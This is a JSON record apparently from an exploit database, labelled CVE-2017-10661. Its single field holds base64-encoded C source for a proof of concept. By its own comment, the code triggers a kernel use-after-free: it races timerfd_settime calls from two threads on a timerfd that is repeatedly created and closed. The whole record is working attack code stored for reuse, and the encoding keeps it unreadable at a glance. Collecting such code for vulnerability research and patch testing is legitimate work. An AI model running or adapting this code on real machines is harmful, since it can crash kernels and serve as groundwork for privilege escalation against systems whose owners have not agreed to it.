{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIFBvQyBmb3IgQ1ZFLTIwMTctMTA2NjEsIHRyaWdnZXJzIFVBRiB3aXRoIEtBU2FuIGVuYWJsZWQgaW4ga2VybmVsIDQuMTANCiAqLw0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN5cy90aW1lcmZkLmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCiNpbmNsdWRlIDxzeXMvbXNnLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDx0aW1lLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pcC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCiNkZWZpbmUgUkFDRV9USU1FIDEwMDAwMDANCmludCBmZDsNCmludCBmZF9kdW1iOw0KaW50IGNvdW50PTA7DQoNCg0Kdm9pZCogbGlzdF9hZGRfdGhyZWFkKHZvaWQqIGFyZyl7DQoNCiAgICBpbnQgcmV0Ow0KDQogICAgc3RydWN0IGl0aW1lcnNwZWMgbmV3ID17DQogICAgICAgIC5pdF9pbnRlcnZhbD17DQogICAgICAgICAgICAudHZfc2VjPTEwMCwNCiAgICAgICAgICAgIC50dl9uc2VjPTEwMA0KICAgICAgICB9LA0KICAgICAgICAuaXRfdmFsdWU9ew0KICAgICAgICAgICAgLnR2X3NlYz0xMDAsDQogICAgICAgICAgICAudHZfbnNlYz0xMDANCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICBpbnQgaT0wOw0KICAgIHdoaWxlKGk8MSl7DQoNCiAgICAgICAgcmV0PXRpbWVyZmRfc2V0dGltZShmZCwzLCZuZXcsTlVMTCk7DQoNCiAgICAgICAgaWYocmV0PDApew0KICAgICAgICAgICAgcGVycm9yKCJ0aW1lcmZkIHNldHRpbWUgZmFpbGVkICEiKTsNCiAgICAgICAgfQ0KICAgICAgICBpKys7DQogICAgfQ0KDQoNCiAgICByZXR1cm4gTlVMTDsNCn0NCg0Kdm9pZCogbGlzdF9kZWxfdGhyZWFkKHZvaWQqIGFyZyl7DQoNCiAgICBpbnQgcmV0Ow0KDQogICAgc3RydWN0IGl0aW1lcnNwZWMgbmV3ID17DQogICAgICAgIC5pdF9pbnRlcnZhbD17DQogICAgICAgICAgICAudHZfc2VjPTEwMCwNCiAgICAgICAgICAgIC50dl9uc2VjPTEwMA0KICAgICAgICB9LA0KICAgICAgICAuaXRfdmFsdWU9ew0KICAgICAgICAgICAgLnR2X3NlYz0xMDAsDQogICAgICAgICAgICAudHZfbnNlYz0xMDANCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICBpbnQgaT0wOw0KICAgIHdoaWxlKGk8MSl7DQogICAgICAgIHJldD10aW1lcmZkX3NldHRpbWUoZmQsMSwmbmV3LE5VTEwpOw0KDQogICAgICAgIGlmKHJldDwwKXsNCiAgICAgICAgICAgIHBlcnJvcigidGltZXJmZCBzZXR0aW1lIGZhaWxlZCAhIik7DQogICAgICAgIH0NCiAgICAgICAgaSsrOw0KICAgIH0NCiAgICByZXR1cm4gTlVMTDsNCg0KfQ0KDQppbnQgcG9zdF9yYWNlKCkNCnsNCiAgICBpbnQgcmV0Ow0KDQogICAgc3RydWN0IGl0aW1lcnNwZWMgbmV3ID17DQogICAgICAgIC5pdF9pbnRlcnZhbD17DQogICAgICAgICAgICAudHZfc2VjPTEwMCwNCiAgICAgICAgICAgIC50dl9uc2VjPTEwMA0KICAgICAgICB9LA0KICAgICAgICAuaXRfdmFsdWU9ew0KICAgICAgICAgICAgLnR2X3NlYz0xMDAsDQogICAgICAgICAgICAudHZfbnNlYz0xMDANCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICBpbnQgaT0wOw0KDQogICAgc3RydWN0IHRpbWV2YWwgdHY9ew0KICAgICAgICAudHZfc2VjID0gMTIwK2NvdW50KjIsDQogICAgICAgIC50dl91c2VjID0gMTAwDQogICAgfTsNCiAgICByZXQ9c2V0dGltZW9mZGF5KCZ0dixOVUxMKTsNCiAgICBpZihyZXQ8MCl7DQogICAgICAgIHBlcnJvcigic2V0dGltZW9mZGF5Iik7DQogICAgfQ0KICAgIHJldHVybiAwOw0KfQ0KDQppbnQgZG9fcmFjZSgpew0KICAgIGludCByZXRfYWRkWzJdOw0KICAgIGludCBpOw0KICAgIGludCBqOw0KICAgIHB0aHJlYWRfdCB0aFsyXT17MH07DQoNCiAgICBpPTA7DQogICAgd2hpbGUoaTxSQUNFX1RJTUUpew0KICAgICAgICBpZihpJTEyOCkNCiAgICAgICAgICAgIHByaW50ZigiJWQKIixpKTsNCg0KDQogICAgICAgIGZkPXRpbWVyZmRfY3JlYXRlKENMT0NLX1JFQUxUSU1FLDApOyAvLyBjcmVhdGUgdGhlIHZpY3RpbSBjdHgNCiAgICAgICAgaWYoZmQ8MCl7DQogICAgICAgICAgICBwZXJyb3IoInRpbWVyZmQgY3JhZXRlIGZhaWxlZCEiKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgICAgICByZXRfYWRkWzBdID0gcHRocmVhZF9jcmVhdGUoJnRoWzBdLE5VTEwsbGlzdF9hZGRfdGhyZWFkLCh2b2lkKikxKTsNCiAgICAgICAgcmV0X2FkZFsxXSA9IHB0aHJlYWRfY3JlYXRlKCZ0aFsxXSxOVUxMLGxpc3RfYWRkX3RocmVhZCwodm9pZCopMik7DQoNCiAgICAgICAgZm9yKCBqPTA7ajwyO2orKyl7DQogICAgICAgICAgICBwdGhyZWFkX2pvaW4odGhbal0sTlVMTCk7DQogICAgICAgIH0NCg0KICAgICAgICBjbG9zZShmZCk7DQogICAgICAgIHVzbGVlcCgxNTAwMDApOw0KDQogICAgICAgIGkrKzsNCiAgICAgICAgY291bnQrKzsNCiAgICB9DQogICAgcmV0dXJuIDA7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyIGNvbnN0ICphcmd2W10pDQp7DQogICAgaW50IHJldDsNCg0KICAgIC8vIGFkZCBkdW1iIGN0eA0KICAgIHZvaWQqIGFyZWE7DQogICAgdm9pZCogYmFzZTsNCiAgICBzdHJ1Y3QgaXRpbWVyc3BlYyBuZXcgPXsNCiAgICAgICAgLml0X2ludGVydmFsPXsNCiAgICAgICAgICAgIC50dl9zZWM9MTAwLA0KICAgICAgICAgICAgLnR2X25zZWM9MTAwDQogICAgICAgIH0sDQogICAgICAgIC5pdF92YWx1ZT17DQogICAgICAgICAgICAudHZfc2VjPTEwMCwNCiAgICAgICAgICAgIC50dl9uc2VjPTEwMA0KICAgICAgICB9DQogICAgfTsNCiAgICBmZF9kdW1iID0gdGltZXJmZF9jcmVhdGUoQ0xPQ0tfUkVBTFRJTUUsMCk7DQoNCiAgICByZXQ9dGltZXJmZF9zZXR0aW1lKGZkX2R1bWIsMywmbmV3LE5VTEwpOw0KICAgIGlmKHJldDwwKXsNCiAgICAgICAgcGVycm9yKCJ0aW1lcmZkIHNldHRpbWUgZmFpbGVkICEiKTsNCiAgICB9DQoNCiAgICByZXQ9ZG9fcmFjZSgpOw0KICAgIGlmKHJldCA8MCl7DQogICAgICAgIHB1dHMoInJhY2UgZmFpbGVkISIpOw0KICAgICAgICBnb3RvIGVycm9yX2VuZDsNCiAgICB9DQoNCiAgICBzbGVlcCg1KTsNCmVycm9yX2VuZDoNCiAgICBjbG9zZShmZCk7DQogICAgZXhpdCgxKTsNCn0=", 
    "id": "43345", 
    "cves": [
        "CVE-2017-10661"
    ]
}